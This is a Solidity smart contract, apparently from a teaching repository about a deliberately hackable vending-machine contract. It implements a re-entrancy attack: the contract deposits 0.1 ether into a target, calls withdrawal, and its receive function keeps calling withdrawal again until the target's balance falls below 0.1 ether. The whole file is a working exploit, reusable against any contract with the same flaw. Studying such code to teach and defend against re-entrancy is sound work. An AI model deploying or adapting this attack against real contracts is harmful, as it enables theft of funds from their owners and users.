// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

// import "https://github.com/sir-josh/Hackable-smart-contract/blob/master/contracts/VendingMachine.sol";
import "./VendingMachine.sol";
import "hardhat/console.sol";

contract AttackVendingMachine{
    VendingMachine public vendingMachine;
    address public owner;


    /**
     * @dev Sets the values for {owner}, initialize {vendingMachine} with
     * the address of target contract to attack
     */
    constructor(address _vendingMachineAddress){  
        vendingMachine = VendingMachine(_vendingMachineAddress);
        owner = msg.sender;
    }

     /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner, "Restricted call: caller is not the owner");
        _;
    }

    /**
     * @dev uses re-entrancy to continue withdrawing from the target contract.
     *
     */
    receive() external payable{
         if(address(vendingMachine).balance >= 0.1 ether){
            vendingMachine.withdrawal();
        }
    }

    /**
     * @dev launches attact on the target contract.
     *
     * Requirements:
     *
     * - The attacker will have deposit at least 0.1 ether to the target victim contract before the attact would hold
     */
    function attackContract() public payable onlyOwner{
        require(msg.value >= 0.1 ether, "Requires at least 0.1 ether to launch an attack");
        vendingMachine.deposit{value: 0.1 ether}();

        vendingMachine.withdrawal();
    }

    /**
     * @dev Returns the balance of the contract.
     */
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}